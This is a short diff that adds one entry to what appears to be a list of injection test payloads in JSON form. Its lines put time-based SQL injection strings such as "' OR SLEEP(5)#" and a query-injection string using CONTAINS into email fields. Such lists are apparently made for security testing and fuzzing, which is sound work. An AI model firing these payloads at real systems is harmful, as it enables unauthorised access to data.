@@ -5,3 +5,4 @@
 "emails":["AnD SLEEP(5)"]
 "emails":["test@gmail.com' OR SLEEP(5)#"]
 {"options":{"id":[],"emails":["AnD SLEEP(5)"],
+{"email":"' OR CONTAINS(c.id, '10')--"}
